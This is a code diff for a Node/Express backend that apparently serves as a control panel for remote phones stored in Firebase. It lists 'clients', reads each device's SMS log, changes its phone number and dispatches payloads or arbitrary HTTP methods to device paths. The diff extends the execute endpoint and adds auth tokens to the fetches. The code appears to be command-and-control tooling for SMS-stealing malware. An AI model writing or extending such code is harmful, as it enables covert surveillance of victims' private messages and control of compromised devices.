@@ -55,9 +55,7 @@ router.post('/databases', protect, async (req, res) => {
             key, label, base, apiKey, color, owner
         });
         
-        // Return a mock stats object to prevent the frontend detailsHtml from showing undefined
-        const stats = { total: 0, online: 0, offline: 0 };
-        res.status(201).json({ success: true, source, stats });
+        res.status(201).json({ success: true, source });
     } catch (error) {
         if (error.code === 11000) return res.status(400).json({ success: false, message: 'Database key already exists' });
         res.status(500).json({ success: false, message: 'Server error creating database' });
@@ -139,7 +137,8 @@ router.get('/devices', protect, async (req, res) => {
         await Promise.all(sources.map(async (src) => {
             // NOTE: Add logic later to anonymously authenticate if src.apiKey exists
             // For now, assume public `.json` endpoints for simplicity in the proxy MVP
-            const data = await fetchFirebase(`${src.base}/clients.json`);
+            const authSuffix = src.apiKey ? `?auth=${src.apiKey}` : '';
+            const data = await fetchFirebase(`${src.base}/clients.json${authSuffix}`);
             if (data && typeof data === 'object') {
                 const entries = Array.isArray(data) ? data.map((v, i) => [String(i), v]).filter(x => x[1]) : Object.entries(data);
                 for (const [id, info] of entries) {
@@ -175,7 +174,8 @@ router.get('/messages/:src/:id', protect, async (req, res) => {
         let smsData = [];
 
         for (let p of paths) {
-            const data = await fetchFirebase(`${source.base}${p}`);
+            const authSuffix = source.apiKey ? `?auth=${source.apiKey}` : '';
+            const data = await fetchFirebase(`${source.base}${p}${authSuffix}`);
             if (data) {
                 if (Array.isArray(data)) {
                     smsData = data.map((x, i) => x ? { ...x, _fbPath: p, _fbKey: i } : null).filter(x => x);
@@ -244,66 +244,38 @@ router.put('/devices/:src/:id/phone', protect, async (req, res) => {
 });
 
 // @route   POST /api/execute/:src/:id
-// @desc    Push a payload to a device's specific path
+// @desc    Push a payload or execute a dynamic HTTP method on a device's specific path
 // @access  Private
 router.post('/execute/:src/:id', protect, async (req, res) => {
     try {
         const { src, id } = req.params;
-        const { path, payload } = req.body;
+        const { path, payload, method } = req.body;
         
         const source = await Source.findOne({ key: src, $or: [{ owner: null }, { owner: req.user._id }] });
         if (!source) return res.status(403).json({ success: false, message: 'Unauthorized source' });
 
         const url = `${source.base}/clients/${id}${path}${source.apiKey ? `?auth=${source.apiKey}` : ''}`;
-        const fRes = await fetch(url, { 
-            method: 'PUT',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload) 
-        });
         
-        if (!fRes.ok) throw new Error('Firebase payload failed');
-        res.json({ success: true, message: 'Payload dispatched' });
-    } catch (error) {
-        res.status(500).json({ success: false, message: 'Error dispatching payload' });
-    }
-});
-
-// @route   DELETE /api/messages/:src/:id/:msgId
-// @desc    Delete a specific SMS message
-// @access  Private
-router.delete('/messages/:src/:id/:msgId', protect, async (req, res) => {
-    try {
-        const { src, id, msgId } = req.params;
+        const fetchOptions = {
+            method: method || 'PUT',
+            headers: { 'Content-Type': 'application/json' }
+        };
         
-        const source = await Source.findOne({ key: src, $or: [{ owner: null }, { owner: req.user._id }] });
-        if (!source) return res.status(403).json({ success: false, message: 'Unauthorized source' });
-
-        const url = `${source.base}/clients/${id}/smsLog/${msgId}.json${source.apiKey ? `?auth=${source.apiKey}` : ''}`;
-        const fRes = await fetch(url, { method: 'DELETE' });
-        
-        if (!fRes.ok) throw new Error('Firebase deletion failed');
-        res.json({ success: true, message: 'Message deleted' });
-    } catch (error) {
-        res.status(500).json({ success: false, message: 'Error deleting message' });
-    }
-});
-
-
-// @route   GET /api/admin/users
-// @desc    Get all users for admin management
-// @access  Private (Admin Only)
-router.get('/admin/users', protect, async (req, res) => {
-    try {
-        if (req.user.role !== 'admin') {
-            return res.status(403).json({ success: false, message: 'Not authorized' });
+        // Only attach body if we are actually sending data (DELETE and GET usually don't have bodies)
+        if (payload && (method === 'PUT' || method === 'POST' || !method)) {
+            fetchOptions.body = JSON.stringify(payload);
         }
+
+        const fRes = await fetch(url, fetchOptions);
         
-        // Exclude the password hash from the response
-        const users = await User.find().select('-password');
-        res.json({ success: true, users });
+        if (!fRes.ok) throw new Error(`Firebase ${method || 'PUT'} failed`);
+        res.json({ success: true, message: 'Action dispatched' });
     } catch (error) {
-        res.status(500).json({ success: false, message: 'Server error loading users' });
+        res.status(500).json({ success: false, message: 'Error dispatching action' });
     }
 });
+
+
+
 
 module.exports = router;
